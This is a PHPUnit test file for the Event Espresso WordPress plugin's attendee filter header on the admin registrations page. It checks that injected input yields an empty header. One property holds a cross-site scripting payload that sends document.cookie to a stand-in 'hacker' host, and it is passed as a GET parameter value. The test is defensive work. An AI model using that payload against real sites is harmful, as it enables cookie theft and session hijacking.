<?php

namespace EventEspresso\tests\testcases\core\domain\services\admin\registrations\list_table\page_header;

use EE_Attendee;
use EE_Error;
use EEM_Attendee;
use EventEspresso\core\domain\services\admin\registrations\list_table\page_header\AttendeeFilterHeader;
use EventEspresso\core\exceptions\InvalidDataTypeException;
use EventEspresso\core\exceptions\InvalidInterfaceException;
use EventEspresso\tests\mocks\core\services\request\RequestMock;
use InvalidArgumentException;
use PHPUnit\Framework\Exception;
use PHPUnit\Framework\TestCase;
use ReflectionException;

/**
 * @group AdminPageHeaderDecoratorTests
 */
class AttendeeFilterHeaderTest extends TestCase
{
    /**
     * @var EE_Attendee $attendee
     */
    protected $attendee;

    /**
     * @var string $xss
     */
    private $xss = '"><SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>';


    public static function setUpBeforeClass()
    {
        require_once EE_ADMIN . 'EE_Admin_Page.core.php';
        if (! defined('REG_ADMIN_URL')) {
            define('REG_ADMIN_URL', admin_url('admin.php?page=espresso_registrations'));
        }
    }


    /**
     * @throws EE_Error
     * @throws InvalidArgumentException
     * @throws InvalidDataTypeException
     * @throws InvalidInterfaceException
     * @throws ReflectionException
     * @throws Exception
     * @since $VID:$
     */
    public function setUpAttendee()
    {
        $this->attendee = EE_Attendee::new_instance([
            'ATT_fname' => 'Shaggy',
            'ATT_lname' => 'Rogers',
            'ATT_email' => 'shaggy@mysterymachine.com'
        ]);
        $saved = $this->attendee->save();
        $this->assertTrue($saved > 0);
    }


    /**
     * @param array $get_params
     * @return AttendeeFilterHeader
     * @throws EE_Error
     * @throws InvalidDataTypeException
     * @throws InvalidInterfaceException
     * @throws InvalidArgumentException
     * @since $VID:$
     */
    private function getAttendeeFilterHeader(array $get_params)
    {
        return new AttendeeFilterHeader(
            new RequestMock($get_params, [], [], [], []),
            EEM_Attendee::instance()
        );
    }


    /**
     * returns following parameters:
     *      $get_params array of simulated $_GET params
     *      $expected   value of $header_text
     *
     * @return array
     * @throws EE_Error
     * @throws InvalidArgumentException
     * @throws InvalidDataTypeException
     * @throws InvalidInterfaceException
     * @throws ReflectionException
     * @throws Exception
     * @since  $VID:$
     */
    public function testDataProvider()
    {
        $this->setUpAttendee();
        return [
            // empty array
            [[], ''],
            // invalid keys
            [['ATT-ID' => $this->attendee->ID()], ''],
            [['attendee-id' => $this->attendee->ID()], ''],
            // invalid values
            [['ATT_ID' => '<h1>Ruh Oh</h1>'], ''],
            [['ATT_ID' => $this->xss], ''],
            [['attendee_id' => '<h1>Ruh Oh</h1>'], ''],
            [['attendee_id' => $this->xss], ''],
            // all good
            [
                ['ATT_ID' => $this->attendee->ID()],
                '<h3 style="line-height:1.5em;"> Viewing registrations for <a href="http://https://src.wordpress-develop.test/wp-admin/admin.php?page=espresso_registrations&action=edit_attendee&post=8&edit_attendee_nonce=">Shaggy Rogers</a></h3>'
            ],
            [
                ['attendee_id' => $this->attendee->ID()],
                '<h3 style="line-height:1.5em;"> Viewing registrations for <a href="http://https://src.wordpress-develop.test/wp-admin/admin.php?page=espresso_registrations&action=edit_attendee&post=8&edit_attendee_nonce=">Shaggy Rogers</a></h3>'
            ],
        ];
    }


    /**
     * @dataProvider testDataProvider
     * @param array  $get_params
     * @param string $expected
     * @throws EE_Error
     * @throws InvalidArgumentException
     * @throws InvalidDataTypeException
     * @throws InvalidInterfaceException
     * @since  $VID:$
     */
    public function testGetHeaderText(array $get_params, $expected = '')
    {
        $attendee_filter_header = $this->getAttendeeFilterHeader($get_params);
        $header_text = $attendee_filter_header->getHeaderText();
        // strip out nonce since it constantly changes
        $header_text = preg_replace(
            '/&edit_attendee_nonce=\S+"/',
            '&edit_attendee_nonce="',
            $header_text
        );
        $this->assertEquals($expected, $header_text);
    }
}
